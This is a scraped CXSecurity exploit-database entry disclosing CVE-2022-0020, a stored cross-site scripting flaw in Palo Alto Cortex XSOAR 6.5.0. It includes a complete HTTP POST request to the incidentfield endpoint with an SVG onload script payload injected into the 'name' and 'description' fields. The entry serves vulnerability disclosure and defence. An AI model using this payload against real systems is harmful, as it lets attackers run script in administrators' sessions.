---
title: Palo Alto Cortex XSOAR 6.5.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2023040036
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-11
fetch_date: 2025-10-04T11:29:27.776929
---

# Palo Alto Cortex XSOAR 6.5.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Palo Alto Cortex XSOAR 6.5.0 Cross Site Scripting** **2023.04.10**  Credit:  **[omurugur](https://cxsecurity.com/author/omurugur/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-0020](https://cxsecurity.com/cveshow/CVE-2022-0020/ "Click to see CVE-2022-0020")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")**  CVSS Base Score: **3.5/10**  Impact Subscore: **2.9/10**  Exploitability Subscore: **6.8/10**  Exploit range: **Remote**  Attack complexity: **Medium**  Authentication: **Single time**  Confidentiality impact: **None**  Integrity impact: **Partial**  Availability impact: **None** | |

# Exploit Title: Palo Alto Cortex XSOAR 6.5.0 - Stored Cross-Site Scripting (XSS)
# Exploit Author: omurugur
# Vendor Homepage: https://security.paloaltonetworks.com/CVE-2022-0020
# Version: 6.5.0 - 6.2.0 - 6.1.0
# Tested on: [relevant os]
# CVE : CVE-2022-0020
# Author Web: https://www.justsecnow.com
# Author Social: @omurugurrr
A stored cross-site scripting (XSS) vulnerability in Palo Alto Network
Cortex XSOAR web interface enables an authenticated network-based attacker
to store a persistent javascript payload that will perform arbitrary
actions in the Cortex XSOAR web interface on behalf of authenticated
administrators who encounter the payload during normal operations.
POST /acc\_UAB(MAY)/incidentfield HTTP/1.1
Host: x.x.x.x
Cookie: XSRF-TOKEN=xI=; inc-term=x=; S=x+x+x+x/x==; S-Expiration=x;
isTimLicense=false
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0)
Gecko/20100101 Firefox/94.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://x.x.x.x/acc\_UAB(MAY)
Content-Type: application/json
X-Xsrf-Token:
Api\_truncate\_results: true
Origin: https://x.x.x.x
Content-Length: 373
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
{"associatedToAll":true,"caseInsensitive":true,"sla":0,"shouldCommit":true,"threshold":72,"propagationLabels":["all"],"name":"\"/><svg/onload=prompt(document.domain)>","editForm":true,"commitMessage":"Field
edited","type":"html","unsearchable":false,"breachScript":"","shouldPublish":true,"description":"\"/><svg/onload=prompt(document.domain)>","group":0,"required":false}
Regards,
Omur UGUR

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040036)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top